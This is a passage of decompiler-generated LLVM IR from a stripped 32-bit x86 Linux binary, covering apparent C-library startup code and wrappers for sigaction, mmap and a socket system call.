  store i32 %v0_805408a, i32* @ecx, align 4
  %v1_8054090 = icmp eq i32 %v0_805408a, 0
  br i1 %v1_8054090, label %dec_label_pc_8054099, label %dec_label_pc_8054094

dec_label_pc_8054094:                             ; preds = %dec_label_pc_805408a
  %v2_8054094 = load i32, i32* %stack_var_-16, align 4
  %v1_8054097 = call i32 @unknown_0(i32 %v2_8054094)
  br label %dec_label_pc_8054099

dec_label_pc_8054099:                             ; preds = %dec_label_pc_8054094, %dec_label_pc_805408a
  %v2_8054099 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8054099

; uselistorder directives
  uselistorder i32 %v1_8054079, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054072, { 1, 0 }
}

define i32 @function_805409d(i32 %arg1) local_unnamed_addr {
dec_label_pc_805409d:
  ret i32 0
}

define i32 @function_80540a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80540a0:
  %v0_80540a0 = load i32, i32* @eax, align 4
  ret i32 %v0_80540a0
}

define i32 @function_80540a1() local_unnamed_addr {
dec_label_pc_80540a1:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_80540a1 = load i32, i32* @esi, align 4
  %v0_80540a2 = load i32, i32* @ebx, align 4
  %v0_80540a6 = load i32, i32* @eax, align 4
  store i32 %v0_80540a6, i32* @esi, align 4
  %v0_80540a8 = load i32, i32* @edx, align 4
  store i32 %v0_80540a8, i32* @ebx, align 4
  %v4_80540ad = call i32 @function_805211d(i32 %v0_80540a6, i32 1, i32 %tmp6)
  %v8_80540b5 = icmp eq i32 %v4_80540ad, -1
  %v1_80540b6 = icmp eq i1 %v8_80540b5, false
  br i1 %v1_80540b6, label %dec_label_pc_80540d1, label %dec_label_pc_80540b8

dec_label_pc_80540b8:                             ; preds = %dec_label_pc_80540a1
  %v0_80540ba = load i32, i32* @ebx, align 4
  %v6_80540c0 = call i32 @function_80522f2(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80554b4.238, i32 0, i32 0), i32 %v0_80540ba)
  %v1_80540c8 = load i32, i32* @esi, align 4
  %v12_80540c8 = icmp eq i32 %v6_80540c0, %v1_80540c8
  br i1 %v12_80540c8, label %dec_label_pc_80540d1, label %dec_label_pc_80540cc

dec_label_pc_80540cc:                             ; preds = %dec_label_pc_80540b8
  %v0_80540cc = call i32 @function_8053ad5()
  br label %dec_label_pc_80540d1

dec_label_pc_80540d1:                             ; preds = %dec_label_pc_80540b8, %dec_label_pc_80540a1, %dec_label_pc_80540cc
  %v2_80540d1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80540a2, i32* @ebx, align 4
  store i32 %v0_80540a1, i32* @esi, align 4
  ret i32 %v2_80540d1

; uselistorder directives
  uselistorder i32 ()* @function_8053ad5, { 3, 2, 1, 4, 0 }
  uselistorder i32 (i8*, i32)* @function_80522f2, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @function_805211d, { 4, 5, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80540d1, { 2, 0, 1 }
}

define i32 @function_80540d5() local_unnamed_addr {
dec_label_pc_80540d5:
  %v0_80540d8 = load i8, i8* @global_var_8056930.239, align 16
  %v1_80540d8 = icmp eq i8 %v0_80540d8, 0
  %v1_80540df = icmp eq i1 %v1_80540d8, false
  br i1 %v1_80540df, label %dec_label_pc_80540d5.dec_label_pc_8054111_crit_edge, label %dec_label_pc_80540e1

dec_label_pc_80540d5.dec_label_pc_8054111_crit_edge: ; preds = %dec_label_pc_80540d5
  %v0_8054114.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8054111

dec_label_pc_80540e1:                             ; preds = %dec_label_pc_80540d5
  store i8 1, i8* @global_var_8056930.239, align 16
  store i32 4096, i32* @global_var_8056924.240, align 4
  br label %dec_label_pc_8054111

dec_label_pc_8054111:                             ; preds = %dec_label_pc_80540d5.dec_label_pc_8054111_crit_edge, %dec_label_pc_80540e1
  %v0_8054114 = phi i32 [ %v0_8054114.pre, %dec_label_pc_80540d5.dec_label_pc_8054111_crit_edge ], [ 0, %dec_label_pc_80540e1 ]
  ret i32 %v0_8054114

; uselistorder directives
  uselistorder i8 1, { 11, 1, 12, 4, 5, 6, 2, 3, 8, 0, 13, 14, 15, 16, 7, 10, 9 }
  uselistorder i8* @global_var_8056930.239, { 1, 0 }
  uselistorder label %dec_label_pc_8054111, { 1, 0 }
}

define i32 @function_8054115(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8054115:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_8054115 = load i32, i32* @ebp, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805691c.241, align 4
  store i32 %arg6, i32* @global_var_805692c.237, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_805414c = mul i32 %arg2, 4
  %v3_805414c = add i32 %tmp44, %v2_805414c
  %v1_805414f = add i32 %v3_805414c, 4
  store i32 %v1_805414f, i32* @global_var_8056920.242, align 32
  %v3_8054157 = load i32, i32* %arg3, align 4
  %v14_8054157 = icmp eq i32 %v1_805414f, %v3_8054157
  %v1_8054159 = icmp eq i1 %v14_8054157, false
  br i1 %v1_8054159, label %dec_label_pc_8054161, label %dec_label_pc_805415b

dec_label_pc_805415b:                             ; preds = %dec_label_pc_8054115
  store i32 %v3_805414c, i32* @global_var_8056920.242, align 32
  br label %dec_label_pc_8054161

dec_label_pc_8054161:                             ; preds = %dec_label_pc_8054115, %dec_label_pc_805415b
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8054166 = ptrtoint i32* %stack_var_-136 to i32
  %v3_805416b = bitcast i32* %stack_var_-136 to i8*
  %v4_805416b = call i32 @function_805276a(i8* %v3_805416b, i32 0, i32 120)
  %v0_8054170 = load i32, i32* @global_var_8056920.242, align 32
  br label %dec_label_pc_8054178

dec_label_pc_8054178:                             ; preds = %dec_label_pc_8054178, %dec_label_pc_8054161
  %v0_8054178 = phi i32 [ %v1_805417b, %dec_label_pc_8054178 ], [ %v0_8054170, %dec_label_pc_8054161 ]
  %v1_8054178 = inttoptr i32 %v0_8054178 to i32*
  %v2_8054178 = load i32, i32* %v1_8054178, align 4
  %v3_8054178 = icmp eq i32 %v2_8054178, 0
  %v1_805417b = add i32 %v0_8054178, 4
  %v1_805417e = icmp eq i1 %v3_8054178, false
  br i1 %v1_805417e, label %dec_label_pc_8054178, label %dec_label_pc_805419f.preheader

dec_label_pc_805419f.preheader:                   ; preds = %dec_label_pc_8054178
  store i32 %v1_805417b, i32* @ebx, align 4
  %v1_805419f22 = inttoptr i32 %v1_805417b to i32*
  %v2_805419f23 = load i32, i32* %v1_805419f22, align 4
  %v3_805419f24 = icmp eq i32 %v2_805419f23, 0
  %v1_80541a226 = icmp eq i1 %v3_805419f24, false
  br i1 %v1_80541a226, label %dec_label_pc_8054184.lr.ph, label %dec_label_pc_80541a4

dec_label_pc_8054184.lr.ph:                       ; preds = %dec_label_pc_805419f.preheader
  %v3_8054164 = ptrtoint i32* %stack_var_-168 to i32
  %v3_805418f = add i32 %v3_8054164, 32
  br label %dec_label_pc_8054184

dec_label_pc_8054184:                             ; preds = %dec_label_pc_8054184.lr.ph, %dec_label_pc_805419c
  %v1_805418f = phi i32 [ %v2_805419f23, %dec_label_pc_8054184.lr.ph ], [ %v2_805419f, %dec_label_pc_805419c ]
  %v0_805418e = phi i32 [ %v1_805417b, %dec_label_pc_8054184.lr.ph ], [ %v1_805419c, %dec_label_pc_805419c ]
  %v6_8054189 = icmp ugt i32 %v1_805418f, 14
  br i1 %v6_8054189, label %dec_label_pc_805419c, label %dec_label_pc_805418b

dec_label_pc_805418b:                             ; preds = %dec_label_pc_8054184
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_805418e, i32* %stack_var_-168, align 4
  %v2_805418f = mul i32 %v1_805418f, 8
  %v4_805418f = add i32 %v3_805418f, %v2_805418f
  %v3_8054194 = inttoptr i32 %v4_805418f to i16*
  %v4_8054194 = call i32 @function_8054962(i16* %v3_8054194, i32 %v0_805418e, i32 8)
  %v0_805419c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805419c

dec_label_pc_805419c:                             ; preds = %dec_label_pc_8054184, %dec_label_pc_805418b
  %v0_805419c = phi i32 [ %v0_805418e, %dec_label_pc_8054184 ], [ %v0_805419c.pre, %dec_label_pc_805418b ]
  %v1_805419c = add i32 %v0_805419c, 8
  store i32 %v1_805419c, i32* @ebx, align 4
  %v1_805419f = inttoptr i32 %v1_805419c to i32*
  %v2_805419f = load i32, i32* %v1_805419f, align 4
  %v3_805419f = icmp eq i32 %v2_805419f, 0
  %v1_80541a2 = icmp eq i1 %v3_805419f, false
  br i1 %v1_80541a2, label %dec_label_pc_8054184, label %dec_label_pc_80541a4

dec_label_pc_80541a4:                             ; preds = %dec_label_pc_805419c, %dec_label_pc_805419f.preheader
  store i32 %v2_8054166, i32* @eax, align 4
  %v0_80541a8 = call i32 @function_8054a1d()
  store i32 %v0_80541a8, i32* @eax, align 4
  %v0_80541ad = call i32 @function_80540d5()
  %v1_80541b6 = icmp eq i32 %tmp39, 0
  %v1_80541b8 = icmp eq i1 %v1_80541b6, false
  br i1 %v1_80541b8, label %dec_label_pc_80541be, label %dec_label_pc_80541ba

dec_label_pc_80541ba:                             ; preds = %dec_label_pc_80541a4
  %v1_80541ba = and i32 %tmp39, -65536
  %v2_80541ba = or i32 %v1_80541ba, 4096
  br label %dec_label_pc_80541be

dec_label_pc_80541be:                             ; preds = %dec_label_pc_80541a4, %dec_label_pc_80541ba
  %v0_80541be = phi i32 [ %tmp39, %dec_label_pc_80541a4 ], [ %v2_80541ba, %dec_label_pc_80541ba ]
  store i32 %v0_80541be, i32* @global_var_8056924.240, align 4
  %v13_80541c3 = icmp eq i32 %tmp38, -1
  %v1_80541c8 = icmp eq i1 %v13_80541c3, false
  br i1 %v1_80541c8, label %dec_label_pc_80541f3, label %dec_label_pc_80541ca

dec_label_pc_80541ca:                             ; preds = %dec_label_pc_80541be
  %v0_80541ca = call i32 @function_8054741()
  store i32 %v0_80541ca, i32* @ebx, align 4
  %v0_80541d1 = call i32 @function_80546b0()
  %v0_80541d6 = load i32, i32* @ebx, align 4
  %v12_80541d6 = icmp eq i32 %v0_80541d6, %v0_80541d1
  %v1_80541d8 = icmp eq i1 %v12_80541d6, false
  br i1 %v1_80541d8, label %dec_label_pc_8054209, label %dec_label_pc_80541da

dec_label_pc_80541da:                             ; preds = %dec_label_pc_80541ca
  %v0_80541da = call i32 @function_80546d6()
  store i32 %v0_80541da, i32* @ebx, align 4
  %v0_80541e1 = call i32 @function_805468a()
  %v0_80541e6 = load i32, i32* @ebx, align 4
  %v12_80541e6 = icmp eq i32 %v0_80541e6, %v0_80541e1
  %v1_80541e8 = icmp eq i1 %v12_80541e6, false
  br i1 %v1_80541e8, label %dec_label_pc_8054209, label %dec_label_pc_80541ea.thread

dec_label_pc_80541ea.thread:                      ; preds = %dec_label_pc_80541da
  br label %dec_label_pc_8054233

dec_label_pc_80541f3:                             ; preds = %dec_label_pc_80541be
  %v15_80541f3 = icmp eq i32 %tmp38, %tmp37
  %v1_80541f7 = icmp eq i1 %v15_80541f3, false
  br i1 %v1_80541f7, label %dec_label_pc_8054209, label %dec_label_pc_80541f9

dec_label_pc_80541f9:                             ; preds = %dec_label_pc_80541f3
  br label %dec_label_pc_8054209

dec_label_pc_8054209:                             ; preds = %dec_label_pc_80541f9, %dec_label_pc_80541f3, %dec_label_pc_80541da, %dec_label_pc_80541ca
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8054210 = call i32 @function_80540a1()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_805421f = call i32 @function_80540a1()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_805422e = call i32 @function_80540a1()
  br label %dec_label_pc_8054233

dec_label_pc_8054233:                             ; preds = %dec_label_pc_80541ea.thread, %dec_label_pc_8054209
  store i32 ptrtoint (i32* @global_var_80567c4.234 to i32), i32* %esi.global-to-local, align 4
  %v0_8054238 = load i32, i32* @edi, align 4
  %v1_8054238 = inttoptr i32 %v0_8054238 to i32*
  %v2_8054238 = load i32, i32* %v1_8054238, align 4
  store i32 %v2_8054238, i32* bitcast (i32** @global_var_8056848.244 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567c4.234 to i32), i32 -134571972), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8056928.236, align 8
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567c4.234 to i32), i32 -134571972), i32 2), i32 0), label %dec_label_pc_8054258, label %dec_label_pc_8054264

dec_label_pc_8054258:                             ; preds = %dec_label_pc_8054233, %dec_label_pc_8054258
  %v4_8054258 = phi i32 [ %v1_805425f, %dec_label_pc_8054258 ], [ 0, %dec_label_pc_8054233 ]
  %v5_8054258 = mul i32 %v4_8054258, 4
  %v6_8054258 = add i32 %v5_8054258, ptrtoint (i32* @global_var_80567c4.234 to i32)
  %v7_8054258 = inttoptr i32 %v6_8054258 to i32*
  %v8_8054258 = load i32, i32* %v7_8054258, align 4
  call void @__pseudo_call(i32 %v8_8054258)
  %v0_805425f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805425f = add i32 %v0_805425f, 1
  store i32 %v1_805425f, i32* %ebx.global-to-local, align 4
  %v1_8054260 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054260 = icmp ult i32 %v1_805425f, %v1_8054260
  br i1 %v7_8054260, label %dec_label_pc_8054258, label %dec_label_pc_8054264

dec_label_pc_8054264:                             ; preds = %dec_label_pc_8054258, %dec_label_pc_8054233
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567c4.234 to i32), i32 -134571972), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567c4.234 to i32), i32 -134571972), i32 2), i32 0), label %dec_label_pc_805427c, label %dec_label_pc_8054288

dec_label_pc_805427c:                             ; preds = %dec_label_pc_8054264, %dec_label_pc_805427c
  %v4_805427c = phi i32 [ %v1_8054283, %dec_label_pc_805427c ], [ 0, %dec_label_pc_8054264 ]
  store i32 ptrtoint (i32* @global_var_8054283.246 to i32), i32* %stack_var_-164, align 4
  %v5_805427c = mul i32 %v4_805427c, 4
  %v6_805427c = add i32 %v5_805427c, ptrtoint (i32* @global_var_80567c4.234 to i32)
  %v7_805427c = inttoptr i32 %v6_805427c to i32*
  %v8_805427c = load i32, i32* %v7_805427c, align 4
  call void @__pseudo_call(i32 %v8_805427c)
  %v0_8054283 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054283 = add i32 %v0_8054283, 1
  store i32 %v1_8054283, i32* %ebx.global-to-local, align 4
  %v1_8054284 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054284 = icmp ult i32 %v1_8054283, %v1_8054284
  br i1 %v7_8054284, label %dec_label_pc_805427c, label %dec_label_pc_8054288

dec_label_pc_8054288:                             ; preds = %dec_label_pc_805427c, %dec_label_pc_8054264
  %v0_8054291 = load i32, i32* %stack_var_-164, align 4
  %v1_8054291 = call i32 @function_8052719(i32 %v0_8054291)
  %v1_8054296 = inttoptr i32 %v1_8054291 to i32*
  store i32 0, i32* %v1_8054296, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-164, align 4
  %v0_80542b1 = load i32, i32* @global_var_8056920.242, align 32
  store i32 %v0_80542b1, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8054115)
  %v0_80542c6 = load i32, i32* @eax, align 4
  %v1_80542c9 = call i32 @function_8053d29(i32 %v0_80542c6)
  %v0_80542d5 = load i32, i32* @ebx, align 4
  %v1_80542d5 = inttoptr i32 %v0_80542d5 to %sigcontext*
  %v2_80542d5 = call i32 @sigreturn(%sigcontext* %v1_80542d5)
  %v0_80542dd = load i32, i32* @ebx, align 4
  %v1_80542dd = inttoptr i32 %v0_80542dd to %sigcontext*
  %v2_80542dd = call i32 @sigreturn(%sigcontext* %v1_80542dd)
  ret i32 %v2_80542dd

; uselistorder directives
  uselistorder i32 %v1_8054283, { 1, 2, 0 }
  uselistorder i32 %v1_805425f, { 1, 2, 0 }
  uselistorder i32 %v2_805419f, { 1, 0 }
  uselistorder i32 %v1_805419c, { 2, 1, 0 }
  uselistorder i32 %v1_805417b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054178, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_8053d29, { 0, 2, 1 }
  uselistorder i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567c4.234 to i32), i32 -134571972), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567c4.234 to i32), i32 -134571972), i32 2), { 1, 3, 4, 2, 0 }
  uselistorder i32 ()* @function_80540a1, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 120, { 8, 22, 23, 1, 2, 9, 10, 3, 11, 12, 13, 4, 5, 14, 15, 6, 16, 17, 7, 18, 19, 20, 21, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_805427c, { 1, 0 }
  uselistorder label %dec_label_pc_8054258, { 1, 0 }
  uselistorder label %dec_label_pc_8054233, { 1, 0 }
  uselistorder label %dec_label_pc_80541be, { 1, 0 }
  uselistorder label %dec_label_pc_805419c, { 1, 0 }
  uselistorder label %dec_label_pc_8054184, { 1, 0 }
  uselistorder label %dec_label_pc_8054161, { 1, 0 }
}

define i32 @function_80542df(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80542df:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_80542df = load i32, i32* @esi, align 4
  %v0_80542e0 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80542f5 = icmp eq i32* %arg2, null
  br i1 %v1_80542f5, label %dec_label_pc_8054348, label %dec_label_pc_80542f9

dec_label_pc_80542f9:                             ; preds = %dec_label_pc_80542df
  %v2_80542f9 = load i32, i32* %arg2, align 4
  store i32 %v2_80542f9, i32* %stack_var_-148, align 4
  %v1_8054302 = add i32 %tmp11, 4
  %v3_8054314 = bitcast i32* %stack_var_-136 to i16*
  %v4_8054314 = call i32 @function_8054962(i16* %v3_8054314, i32 %v1_8054302, i32 128)
  %v1_8054319 = add i32 %tmp11, 132
  %v2_8054333 = inttoptr i32 %v1_8054319 to i8*
  %v3_8054333 = load i8, i8* %v2_8054333, align 1
  %v4_8054333 = and i8 %v3_8054333, 4
  %v5_8054333 = icmp eq i8 %v4_8054333, 0
  %v1_805433a = icmp eq i1 %v5_8054333, false
  br i1 %v1_805433a, label %dec_label_pc_8054348, label %dec_label_pc_805433c

dec_label_pc_805433c:                             ; preds = %dec_label_pc_80542f9
  br label %dec_label_pc_8054348

dec_label_pc_8054348:                             ; preds = %dec_label_pc_805433c, %dec_label_pc_80542f9, %dec_label_pc_80542df
  %v1_805434a = icmp eq i32 %arg3, 0
  br i1 %v1_805434a, label %dec_label_pc_8054352, label %dec_label_pc_805434e

dec_label_pc_805434e:                             ; preds = %dec_label_pc_8054348
  %v2_805434e = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8054352

dec_label_pc_8054352:                             ; preds = %dec_label_pc_8054348, %dec_label_pc_805434e
  %v0_8054361 = phi i32 [ 0, %dec_label_pc_8054348 ], [ %v2_805434e, %dec_label_pc_805434e ]
  br i1 %v1_80542f5, label %dec_label_pc_805435f, label %dec_label_pc_8054358

dec_label_pc_8054358:                             ; preds = %dec_label_pc_8054352
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805435f

dec_label_pc_805435f:                             ; preds = %dec_label_pc_8054352, %dec_label_pc_8054358
  %v0_8054362 = phi %sigaction* [ null, %dec_label_pc_8054352 ], [ %phitmp, %dec_label_pc_8054358 ]
  %v5_805436a = call i32 @function_8054405(i32 %arg1, %sigaction* %v0_8054362, i32 %v0_8054361, i32 8)
  store i32 %v5_805436a, i32* %ebx.global-to-local, align 4
  br i1 %v1_805434a, label %dec_label_pc_80543ad, label %dec_label_pc_8054378

dec_label_pc_8054378:                             ; preds = %dec_label_pc_805435f
  %v2_8054378 = icmp slt i32 %v5_805436a, 0
  br i1 %v2_8054378, label %dec_label_pc_80543ad, label %dec_label_pc_805437c

dec_label_pc_805437c:                             ; preds = %dec_label_pc_8054378
  %v3_805437c = load i32, i32* %stack_var_-288, align 4
  %v2_8054380 = inttoptr i32 %arg3 to i32*
  store i32 %v3_805437c, i32* %v2_8054380, align 4
  %v2_8054388 = ptrtoint i32* %stack_var_-276 to i32
  %v1_805438d = add i32 %arg3, 4
  %v3_8054391 = inttoptr i32 %v1_805438d to i16*
  %v4_8054391 = call i32 @function_8054962(i16* %v3_8054391, i32 %v2_8054388, i32 128)
  %v2_805439a = add i32 %arg3, 132
  %v3_805439a = inttoptr i32 %v2_805439a to i32*
  %v2_80543a7 = add i32 %arg3, 136
  %v3_80543a7 = inttoptr i32 %v2_80543a7 to i32*
  %v0_80543ad.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80543ad

dec_label_pc_80543ad:                             ; preds = %dec_label_pc_8054378, %dec_label_pc_805435f, %dec_label_pc_805437c
  %v0_80543ad = phi i32 [ %v5_805436a, %dec_label_pc_8054378 ], [ %v5_805436a, %dec_label_pc_805435f ], [ %v0_80543ad.pre, %dec_label_pc_805437c ]
  store i32 %v0_80542e0, i32* @ebx, align 4
  store i32 %v0_80542df, i32* @esi, align 4
  ret i32 %v0_80543ad

; uselistorder directives
  uselistorder i32 %v5_805436a, { 0, 1, 3, 2 }
  uselistorder i32 136, { 1, 0, 2 }
  uselistorder i8 4, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32 132, { 1, 2, 0, 3 }
  uselistorder i32 128, { 6, 7, 11, 8, 10, 0, 1, 2, 3, 4, 5, 9 }
  uselistorder i32* null, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 2, 0, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_80543ad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805435f, { 1, 0 }
  uselistorder label %dec_label_pc_8054352, { 1, 0 }
}

define i32 @function_80543b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_80543b8:
  %stack_var_4 = alloca i32, align 4
  %v0_80543b8 = load i32, i32* @ebx, align 4
  store i32 %v0_80543b8, i32* @edx, align 4
  %v2_80543c3 = load i32, i32* @ecx, align 4
  %v4_80543c3 = load i32, i32* @esi, align 4
  %v5_80543c3 = load i32, i32* @edi, align 4
  %v6_80543c3 = load i32, i32* @ebp, align 4
  %v7_80543c3 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_80543c3, i32 %v0_80543b8, i32 %v4_80543c3, i32 %v5_80543c3, i32 %v6_80543c3)
  %v8_80543c3 = ptrtoint i32* %v7_80543c3 to i32
  store i32 %v0_80543b8, i32* @ebx, align 4
  %v3_80543cc = icmp ugt i32* %v7_80543c3, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_80543cc, i32 134564453)
  ret i32 %v8_80543c3

; uselistorder directives
  uselistorder i32* @ebp, { 7, 68, 69, 70, 71, 72, 73, 74, 75, 76, 32, 33, 34, 35, 77, 78, 79, 80, 81, 82, 83, 84, 89, 85, 86, 87, 88, 6, 90, 10, 2, 21, 22, 11, 29, 15, 8, 14, 16, 18, 1, 23, 9, 0, 28, 12, 13, 17, 19, 20, 24, 25, 26, 27, 30, 31, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 3, 47, 48, 49, 50, 4, 51, 52, 53, 54, 55, 56, 57, 58, 59, 5, 60, 61, 62, 63, 64, 65, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 111, 109, 110, 112, 113, 114, 115, 116, 117, 66, 67 }
  uselistorder i32* @ecx, { 5, 17, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0, 41, 42, 43, 1, 44, 20, 19, 18, 45, 46, 47, 2, 48, 49, 50, 3, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 7, 8, 4, 9, 10, 11, 62, 12, 13, 14, 15, 16, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 6, 88, 89, 90, 91 }
}

define i32 @function_80543d3(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80543d3:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80543d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80543d3, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_80543e6 = call i32 @int80_syscall(i32 102)
  store i32 %v1_80543e6, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_80543e6, -4095
  br i1 %tmp9, label %dec_label_pc_80543ff, label %dec_label_pc_80543f3

dec_label_pc_80543f3:                             ; preds = %dec_label_pc_80543d3
  %v1_80543f3 = call i32 @function_8052719(i32 %v0_80543d3)
  %v0_80543f8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80543f8 = sub i32 0, %v0_80543f8
  %v2_80543fa = inttoptr i32 %v1_80543f3 to i32*
  store i32 %v1_80543f8, i32* %v2_80543fa, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054403.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80543ff

dec_label_pc_80543ff:                             ; preds = %dec_label_pc_80543d3, %dec_label_pc_80543f3
  %v2_8054403 = phi i32 [ %v0_80543d3, %dec_label_pc_80543d3 ], [ %v2_8054403.pre, %dec_label_pc_80543f3 ]
  %v0_80543ff = phi i32 [ %v1_80543e6, %dec_label_pc_80543d3 ], [ -1, %dec_label_pc_80543f3 ]
  %v2_8054401 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054401, i32* @edx, align 4
  store i32 %v2_8054403, i32* @ebx, align 4
  ret i32 %v0_80543ff

; uselistorder directives
  uselistorder i32 %v1_80543e6, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80543ff, { 1, 0 }
}

define i32 @function_8054405(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054405:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8054406 = load i32, i32* @esi, align 4
  store i32 %v0_8054406, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805441a = load i32, i32* @ebx, align 4
  %v7_8054422 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8054422, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8054422, -4095
  br i1 %tmp14, label %dec_label_pc_805443a, label %dec_label_pc_805442e

dec_label_pc_805442e:                             ; preds = %dec_label_pc_8054405
  %v1_805442e = call i32 @function_8052719(i32 %v0_805441a)
  %v0_8054433 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054433 = sub i32 0, %v0_8054433
  %v2_8054435 = inttoptr i32 %v1_805442e to i32*
  store i32 %v1_8054433, i32* %v2_8054435, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805443d.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805443a

dec_label_pc_805443a:                             ; preds = %dec_label_pc_8054405, %dec_label_pc_805442e
  %v2_805443d = phi i32 [ %v0_8054406, %dec_label_pc_8054405 ], [ %v2_805443d.pre, %dec_label_pc_805442e ]
